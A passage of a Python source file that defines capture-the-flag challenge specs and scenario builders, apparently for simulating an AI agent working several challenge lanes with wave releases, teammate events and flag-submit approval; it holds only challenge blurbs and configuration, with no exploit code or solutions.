    "field-trip", "misc", "Field Trip", 100, "Bring your badge to the hardware village and scan it at the kiosk.",
    solves=6, status=ChallengeStatus.BLOCKED, note="needs the on-site kiosk; no remote path",
)
STATIC_HISS = Spec(
    "static-hiss", "for", "Static Hiss", 50,
    "A numbers station drifted onto our frequency. The recording is mostly hiss, but the operator "
    "swears there is a picture in it if you scan it slowly enough.",
    ("static_hiss.wav",), solves=88, script=static_hiss,
)
SECOND_GUESS = Spec(
    "second-guess", "cry", "Second Guess", 50,
    "We encrypted the flag with a shift cipher, then did it again for extra safety. Twice the shifts, twice the security?",
    ("second_guess.txt",), solves=300, model="sonnet", script=second_guess,
)
PAPER_TRAIL = Spec(
    "paper-trail", "web", "Paper Trail", 200,
    "Our helpdesk exports tickets as PDFs. Source attached; the instance runs the same build.",
    ("paper_trail_src.zip",), live=True, solves=12, script=paper_trail,
)
TICKET_DESK = Spec(
    "ticket-desk", "web", "Ticket Desk", 100,
    "Submit a ticket and our support bot will read it. It is very eager to help.",
    ("ticket_desk.zip",), live=True, solves=41, model="sonnet", script=ticket_desk,
)
NIGHT_SHIFT = Spec(
    "night-shift", "rev", "Night Shift", 150,
    "The night-shift supervisor only lets you clock out with the right badge code.",
    ("night_shift",), solves=23, script=night_shift,
)
HARBOR_MASTER = Spec(
    "harbor-master", "pwn", "Harbor Master", 250,
    "The harbor master's console logs every ship. The log has room for exactly as many ships as they expected.",
    ("harbor_master", "libc.so.6"), live=True, solves=9, model="sonnet", script=harbor_master,
)

EARLY = (FIRST_LIGHT, FIELD_TRIP, STATIC_HISS, SECOND_GUESS, PAPER_TRAIL, TICKET_DESK, NIGHT_SHIFT, HARBOR_MASTER)


def _ids(specs: tuple[Spec, ...]) -> tuple[str, ...]:
    return tuple(s.id for s in specs)


def _small(name: str, summary: str, special: Spec, extra: tuple[str, ...], **kw) -> Scenario:
    generic_specs = tuple(s for s in WAVE_GENERIC if s.id in extra)
    specs = (special, *generic_specs)
    return Scenario(
        name=name,
        summary=summary,
        specs=specs,
        timeline=((0, ReleaseAt(_ids(specs), "Board")),),
        start_at=kw.pop("start_at", 2 * 3600.0),
        **kw,
    )


def default() -> Scenario:
    specs = (*EARLY, *WAVE)
    return Scenario(
        name="default",
        summary="An event in progress: every cue below on one board, then a 43-challenge wave drops",
        specs=specs,
        timeline=(
            (0, ReleaseAt(_ids(EARLY), "Board")),
            (36, ReleaseAt(_ids(WAVE), "Wave 2")),
            (40, TeammateClaim("lucky-sevens", "delta")),
            (50, TeammateSolve("night-shift", "bravo")),
            (64, TeammateSolve("parcel-tracker", "bravo")),
        ),
        team=True,
        prerun=32,
        start_at=90 * 60.0,
    )


def wave() -> Scenario:
    return Scenario(
        name="wave",
        summary="Wave drop: 43 challenges arrive at once; 16 lanes start and the rest queue",
        specs=WAVE,
        timeline=((2, ReleaseAt(_ids(WAVE), "Wave")),),
    )


def sstv() -> Scenario:
    return _small(
        "sstv",
        "A 50-point forensics challenge hints at slow-scan TV; the lane compares stereo channels",
        STATIC_HISS,
        ("muddy-footprints", "bent-coin", "lantern-api"),
    )


def overthinking() -> Scenario:
    return _small(
        "overthinking",
        "A 50-pointer that 300 teams solved, at 40 turns and counting",
        SECOND_GUESS,
        ("tin-soldier", "postcard", "form-letter"),
        prerun=34,
    )


def web() -> Scenario:
    return _small(
        "web",
        "A web lane brute-forces directories while the source is in the handout",
        PAPER_TRAIL,
        ("jukebox", "pocket-litter", "bread-line"),
    )


def team() -> Scenario:
    specs = (NIGHT_SHIFT, HARBOR_MASTER, *(s for s in WAVE_GENERIC if s.id in ("lucky-sevens", "bent-coin", "tollbooth", "origami", "postcard")))
    return Scenario(
        name="team",
        summary="Team mode: a teammate solves a challenge a lane is on, and holds another's live box",
        specs=specs,
        timeline=(
            (0, ReleaseAt(_ids(specs), "Board")),
            (4, TeammateClaim("postcard", "delta")),
            (12, TeammateSolve("night-shift", "bravo")),
            (20, TeammateSolve("lucky-sevens", "bravo")),
        ),
        team=True,
        max_lanes=4,
        start_at=3 * 3600.0,
    )


def flag() -> Scenario:
    return _small(
        "flag",
        "A lane finds a flag; approve the submit and the board updates",
        TICKET_DESK,
        ("mirror-maze", "shredded-memo"),
    )


SCENARIOS: dict[str, Callable[[], Scenario]] = {
    "default": default,
    "wave": wave,
    "sstv": sstv,
    "overthinking": overthinking,
    "web": web,
    "team": team,
    "flag": flag,
}


def get(name: str) -> Scenario:
    try:
        return SCENARIOS[name]()
    except KeyError:
        raise KeyError(f"unknown scenario {name!r}; choose from: {', '.join(SCENARIOS)}") from None
